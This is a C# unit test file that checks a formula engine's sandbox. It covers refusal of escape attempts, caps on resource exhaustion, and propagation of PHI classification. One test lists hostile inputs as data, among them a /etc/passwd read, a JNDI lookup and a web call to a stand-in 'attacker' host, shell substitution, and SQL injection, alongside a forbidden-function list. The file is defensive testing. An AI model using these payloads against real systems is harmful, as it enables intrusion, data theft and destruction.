using Edpf.Abstractions.Primitives;
using Edpf.Abstractions.Query;
using Edpf.Formula;
using Edpf.Metadata;

namespace Edpf.UnitTests.Formula;

/// <summary>
/// Phase 08c's security requirement: *"A user-authored formula is untrusted
/// input regardless of who authored it."*
/// </summary>
/// <remarks>
/// Two distinct threats, treated separately because they need different
/// defences: **escape** (reaching I/O, reflection or code generation) and
/// **exhaustion** (consuming the server without escaping anything).
/// </remarks>
public sealed class FormulaSandboxTests
{
    private static readonly FormulaEngine Engine = new();

    // ── escape ─────────────────────────────────────────────────────────────

    [Theory]
    [InlineData("System.IO.File.ReadAllText(\"/etc/passwd\")")]
    [InlineData("typeof(System.Object)")]
    [InlineData("new System.Net.WebClient()")]
    [InlineData("[Amount].GetType()")]
    [InlineData("Amount.ToString()")]
    [InlineData("$(whoami)")]
    [InlineData("${jndi:ldap://attacker/x}")]
    [InlineData("1; DROP TABLE Invoice")]
    [InlineData("INDIRECT(\"A1\")")]
    [InlineData("WEBSERVICE(\"http://attacker/\")")]
    [InlineData("EVAL(\"1+1\")")]
    [InlineData("EXEC(\"cmd\")")]
    public void HostileSource_IsRefusedAtParseTime(string source)
    {
        // Not "sanitized" — refused. The grammar has no node for member
        // access, indexing, assignment or method invocation, so there is
        // nothing for these to parse into.
        Result<FormulaNode> result = Engine.Parse(source);

        Assert.True(result.IsFailure, $"'{source}' should not parse.");
    }

    [Fact]
    public void Grammar_HasNoNodeForMemberAccess()
    {
        // The absence is the sandbox. A formula cannot name a .NET type, so it
        // cannot reach reflection; it cannot call a method on a value, so it
        // cannot reach I/O.
        Assert.True(Engine.Parse("[Amount].Length").IsFailure);
        Assert.True(Engine.Parse("[Amount][0]").IsFailure);
        Assert.True(Engine.Parse("[Amount] = 1 = 2 = 3").IsFailure);
    }

    [Fact]
    public void AstHierarchy_CannotBeExtendedFromOutsideTheAssembly()
    {
        // The bounded-AST property, machine-checked: FormulaNode's constructor
        // is private protected, so no external assembly can introduce a node
        // the evaluator was not written to handle.
        Type node = typeof(FormulaNode);

        Assert.True(node.IsAbstract);
        Assert.Empty(node.GetConstructors(
            System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Instance));
    }

    [Fact]
    public void FunctionLibrary_ContainsNoFunctionThatReachesOutsideItsArguments()
    {
        // A registry review, asserted rather than trusted to a reader. Any of
        // these names appearing later means someone added a capability the
        // sandbox argument does not cover.
        string[] forbidden =
        [
            "INDIRECT", "EVAL", "EXEC", "WEBSERVICE", "IMPORTXML", "IMPORTDATA",
            "HYPERLINK", "CALL", "REGISTER", "SQL", "SHELL", "REPT", "NOW", "TODAY", "RAND",
        ];

        foreach (string name in forbidden)
        {
            Assert.False(
                FormulaFunctions.Standard.Contains(name),
                $"'{name}' must not be a registered function: it either performs I/O, turns data into "
                + "code, amplifies memory, or makes evaluation non-deterministic.");
        }
    }

    [Fact]
    public void Evaluation_IsDeterministic_SoAFormulaIsTestableBeforeItGoesLive()
    {
        // No clock, no randomness, no ambient state. NOW() and RAND() are
        // absent for this reason: a formula that changes its answer between
        // runs cannot be unit-tested, and the phase requires that it can be.
        var context = TestFormulaContext.WithValues(("A", FormulaValue.FromNumber(7m)));

        FormulaValue first = Engine.Evaluate("[A] * 3 + 1", context).Value;
        FormulaValue second = Engine.Evaluate("[A] * 3 + 1", context).Value;

        Assert.Equal(first, second);
    }

    // ── exhaustion ─────────────────────────────────────────────────────────

    [Fact]
    public void DeeplyNestedFormula_IsRefused_RatherThanOverflowingTheStack()
    {
        // The parser descends as it reads, so the ceiling has to apply during
        // the parse. Validating the tree afterwards is too late: building it
        // is what consumed the stack.
        //
        // Deliberately short enough to pass the source-length check, so this
        // exercises the depth cap rather than the length cap. Without the
        // depth cap, 2,000 nested parentheses is roughly 14,000 stack frames —
        // a StackOverflowException, which .NET cannot catch and which takes
        // the process down rather than returning an error.
        string source = new string('(', 2_000) + "1" + new string(')', 2_000);
        Assert.True(source.Length < FormulaLimits.Default.MaxSourceLength);

        Result<FormulaNode> result = Engine.Parse(source);

        Assert.True(result.IsFailure);
        Assert.Contains("nests deeper", result.Error!.Message, StringComparison.Ordinal);
    }

    [Fact]
    public void OverlongSource_IsRefusedBeforeParsing()
    {
        string source = string.Join(" + ", Enumerable.Repeat("1", 10_000));

        Assert.True(Engine.Parse(source).IsFailure);
    }

    [Fact]
    public void TooManyNodes_IsRefused()
    {
        var engine = new FormulaEngine(new FormulaLimits(maxNodes: 10));

        Result<FormulaNode> result = engine.Parse("1+1+1+1+1+1+1+1+1+1+1+1+1+1+1");

        Assert.True(result.IsFailure);
        Assert.Contains("nodes", result.Error!.Message, StringComparison.Ordinal);
    }

    [Fact]
    public void StepBudget_StopsAnExpensiveEvaluation()
    {
        // A deterministic budget rather than a wall-clock timeout: the same
        // formula gets the same verdict on an idle machine and a loaded one,
        // which is what makes the limit testable at all.
        var engine = new FormulaEngine(new FormulaLimits(maxSteps: 5));

        Result<FormulaValue> result = engine.Evaluate(
            "1+1+1+1+1+1+1+1+1+1", TestFormulaContext.Empty());

        Assert.True(result.IsFailure);
        Assert.Equal(ErrorCodes.QueryCostExceeded, result.Error!.Code);
    }

    [Fact]
    public void TextAmplification_IsCapped()
    {
        // Concatenation doubles cheaply: ten doublings from 1 KB is 1 MB,
        // twenty is 1 GB.
        var engine = new FormulaEngine(new FormulaLimits(maxTextLength: 64));
        var context = TestFormulaContext.WithValues(
            ("S", FormulaValue.FromText(new string('x', 40))));

        Result<FormulaValue> result = engine.Evaluate("[S] & [S]", context);

        Assert.True(result.IsFailure);
        Assert.Equal(ErrorCodes.QueryCostExceeded, result.Error!.Code);
    }

    [Fact]
    public void ExponentiationBlowup_IsCapped()
    {
        // POWER(9, 9999) would spin in decimal multiplication until it
        // overflowed, having done the work first.
        Result<FormulaValue> result = Engine.Evaluate("POWER(9, 9999)", TestFormulaContext.Empty());

        Assert.True(result.IsFailure);
        Assert.Equal(ErrorCodes.QueryCostExceeded, result.Error!.Code);
    }

    [Fact]
    public void DecimalOverflow_IsReported_NotSilentlyClamped()
    {
        // A silently clamped invoice total is a wrong number presented as a
        // right one.
        Result<FormulaValue> result = Engine.Evaluate(
            "POWER(1000000000, 20)", TestFormulaContext.Empty());

        Assert.True(result.IsFailure);
    }

    [Fact]
    public void ZeroLimit_IsRefusedAtConstruction()
    {
        // A ceiling of zero reads as "no limit" to whoever configured it, and
        // is in fact a total block.
        Assert.Throws<ArgumentOutOfRangeException>(() => new FormulaLimits(maxSteps: 0));
    }

    // ── classification propagation ─────────────────────────────────────────

    [Fact]
    public void ResultOfAFormulaReadingPhi_IsItselfPhi()
    {
        // Without this, a formula is a laundering mechanism: read protected
        // data, multiply by one, and emit an answer no redactor, encryptor or
        // export filter will touch.
        var context = TestFormulaContext.WithValues(
            ("Weight", FormulaValue.FromNumber(72.5m, DataClassificationLevel.Phi)));

        FormulaValue result = Engine.Evaluate("[Weight] * 1", context).Value;

        Assert.Equal(DataClassificationLevel.Phi, result.Classification);
    }

    [Fact]
    public void ResultTakesTheHighestClassificationAmongItsInputs()
    {
        var context = TestFormulaContext.WithValues(
            ("Public", FormulaValue.FromNumber(1m)),
            ("Internal", FormulaValue.FromNumber(2m, DataClassificationLevel.Internal)),
            ("Phi", FormulaValue.FromNumber(3m, DataClassificationLevel.Phi)));

        Assert.Equal(
            DataClassificationLevel.Phi,
            Engine.Evaluate("[Public] + [Internal] + [Phi]", context).Value.Classification);

        Assert.Equal(
            DataClassificationLevel.Internal,
            Engine.Evaluate("[Public] + [Internal]", context).Value.Classification);
    }

    [Fact]
    public void ClassificationSurvivesEveryOperatorAndFunction()
    {
        // Each of these is a place a naive implementation would construct a
        // fresh value and drop the classification with it.
        var context = TestFormulaContext.WithValues(
            ("Phi", FormulaValue.FromNumber(4m, DataClassificationLevel.Phi)),
            ("PhiText", FormulaValue.FromText("secret", DataClassificationLevel.Phi)));

        string[] formulas =
        [
            "[Phi] + 1", "[Phi] - 1", "[Phi] * 2", "[Phi] / 2", "[Phi]^2", "-[Phi]",
            "ABS([Phi])", "ROUND([Phi], 1)", "SQRT([Phi])", "SUM([Phi], 1)", "MAX([Phi], 1)",
            "[Phi] > 1", "[Phi] = 4", "UPPER([PhiText])", "LEN([PhiText])",
            "[PhiText] & \"x\"", "CONCAT([PhiText], \"x\")", "LEFT([PhiText], 2)",
            "IF([Phi] > 1, 0, 0)",
        ];

        foreach (string formula in formulas)
        {
            FormulaValue result = Engine.Evaluate(formula, context).Value;
            Assert.Equal(DataClassificationLevel.Phi, result.Classification);
        }
    }

    [Fact]
    public void ConditionsClassification_CountsEvenWhenTheBranchIsUnclassified()
    {
        // Which branch was taken is itself information derived from the
        // condition. IF([Phi] > 100, "high", "low") leaks a fact about the
        // protected value.
        var context = TestFormulaContext.WithValues(
            ("Phi", FormulaValue.FromNumber(150m, DataClassificationLevel.Phi)));

        FormulaValue result = Engine.Evaluate("IF([Phi] > 100, \"high\", \"low\")", context).Value;

        Assert.Equal("high", result.Text);
        Assert.Equal(DataClassificationLevel.Phi, result.Classification);
    }

    [Fact]
    public void ClassificationCannotBeLowered()
    {
        FormulaValue phi = FormulaValue.FromNumber(1m, DataClassificationLevel.Phi);

        Assert.Equal(
            DataClassificationLevel.Phi,
            phi.WithClassificationAtLeast(DataClassificationLevel.Public).Classification);
    }

    [Fact]
    public void ResultClassification_IsKnowableBeforeEvaluation()
    {
        // Lets a caller decide where a computed value may be stored before
        // computing it. A KPI derived from PHI needs a PHI-classified home,
        // and the answer must be known at design time rather than discovered
        // once the value is already written somewhere unprotected.
        var metadata = new EntityMetadata("Calc", "CALC",
        [
            new FieldMetadata("Weight", "Weight", typeof(decimal), DataClassificationLevel.Phi),
            new FieldMetadata("Factor", "Factor", typeof(decimal), DataClassificationLevel.Public,
                isFilterable: true),
        ]);

        FormulaNode parsed = Engine.Parse("[Weight] * [Factor]").Value;

        Assert.Equal(
            DataClassificationLevel.Phi,
            FormulaEngine.ResultClassification(parsed, metadata).Value);
    }

    [Fact]
    public void RuntimeDefinedClassifiedField_IsTreatedLikeAnyOther()
    {
        // The Phase 05b guarantee carried into the formula engine: a custom
        // field a customer defined this morning classifies its results exactly
        // as a compiled field would.
        var repository = new MetadataRepository();
        repository.RegisterCompiled(new EntityMetadata("Calc", "CALC",
        [
            new FieldMetadata("Factor", "Factor", typeof(decimal), DataClassificationLevel.Public,
                isFilterable: true),
        ]));

        DateTimeOffset now = new(2026, 8, 2, 0, 0, 0, TimeSpan.Zero);
        repository.AddOverlay(new MetadataOverlay(
            "Calc",
            Guid.Parse("aaaaaaaa-0000-0000-0000-000000000001"),
            [
                new FieldMetadata("CustomScore", "cf_CustomScore", typeof(decimal),
                    DataClassificationLevel.Phi, isRuntimeDefined: true),
            ],
            now.AddDays(-1)));

        IEntityMetadata metadata = repository.GetEntity(
            "Calc", Guid.Parse("aaaaaaaa-0000-0000-0000-000000000001"), now).Value;

        FormulaNode parsed = Engine.Parse("[CustomScore] * [Factor]").Value;

        Assert.Equal(
            DataClassificationLevel.Phi,
            FormulaEngine.ResultClassification(parsed, metadata).Value);
    }
}
